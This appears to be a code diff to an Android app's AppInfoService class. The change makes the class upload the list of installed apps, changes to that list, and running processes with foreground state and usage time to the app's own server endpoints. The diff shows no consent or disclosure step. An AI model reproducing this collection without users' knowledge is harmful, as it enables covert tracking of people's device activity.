@@ -6,6 +6,11 @@ import android.content.pm.PackageManager;
 import android.os.SystemClock;
 
 import com.fs.fs.App;
+import com.fs.fs.api.network.ApiConfig;
+import com.fs.fs.api.network.core.BaseResponse;
+import com.fs.fs.api.network.core.HttpParams;
+import com.fs.fs.api.network.core.OkHttpUtils;
+import com.fs.fs.api.network.core.callback.HttpCallback;
 import com.fs.fs.bean.AppInfo;
 import com.fs.fs.utils.Constant;
 import com.fs.fs.utils.DateUtils;
@@ -17,6 +22,8 @@ import com.jaredrummler.android.processes.models.AndroidAppProcess;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
+
+import okhttp3.Headers;
 
 /**
  * Created by wyx on 2016/12/29.
@@ -39,16 +46,15 @@ public class AppInfoService {
 
 
     public interface AppInfoListener {
-        void onSucceed(List<AppInfo> appInfos);
+        void onSucceed(List<AppInfo> infos, List<AppInfo> update);
     }
 
     public AppInfoListener mAppInfoListener;
 
-    public void getInstallAppInfo(AppInfoListener listener) {
-        mAppInfoListener = listener;
+    public void getInstallAppInfo() {
         List<PackageInfo> installedPackages = mPackageManager.getInstalledPackages(0);
 
-        List<AppInfo> appInfos = new ArrayList<>();
+        final List<AppInfo> appInfos = new ArrayList<>();
         HashMap<String, AppInfo> newMap = new HashMap<>();
         for (PackageInfo packageInfo : installedPackages) {
             ApplicationInfo applicationInfo = packageInfo.applicationInfo;
@@ -71,9 +77,20 @@ public class AppInfoService {
             }
         }
         List<AppInfo> update = updateInfo(appInfos, newMap);
-        if (update != null) {
-            mAppInfoListener.onSucceed(update);
-        }
+        HttpParams httpParams = new HttpParams();
+        httpParams.addJson("app_info", appInfos)
+                .addJson("update", update);
+        OkHttpUtils.postAsync(ApiConfig.getInstallAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
+            @Override
+            public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.RUNNING_APP, appInfos);
+            }
+
+            @Override
+            public void onError(String errorMsg) {
+
+            }
+        });
     }
 
     private List<AppInfo> updateInfo(List<AppInfo> appInfos, HashMap<String, AppInfo> newMap) {
@@ -91,14 +108,12 @@ public class AppInfoService {
             for (String key : newMap.keySet()) {
                 newList.add(newMap.get(key));
             }
-            SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.RUNNING_APP, appInfos);
             return newList;
         }
         return null;
     }
 
-    public void getRunningAppInfo(AppInfoListener listener) {
-        mAppInfoListener = listener;
+    public void getRunningAppInfo() {
         List<AppInfo> runningAppInfos = new ArrayList<>();
         List<AndroidAppProcess> processes = AndroidProcesses.getRunningAppProcesses();
         try {
@@ -124,7 +139,21 @@ public class AppInfoService {
                     LogUtils.d("%s:%b:%s", appInfo.appName, appInfo.isForeground, appInfo.runningTime);
                 }
             }
-            mAppInfoListener.onSucceed(runningAppInfos);
+            if (runningAppInfos.size() > 0) {
+                HttpParams httpParams = new HttpParams();
+                httpParams.addJson("app_info", runningAppInfos);
+                OkHttpUtils.postAsync(ApiConfig.getRunningAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
+                    @Override
+                    public void onSuccess(BaseResponse httpResponse, Headers headers) {
+
+                    }
+
+                    @Override
+                    public void onError(String errorMsg) {
+
+                    }
+                });
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
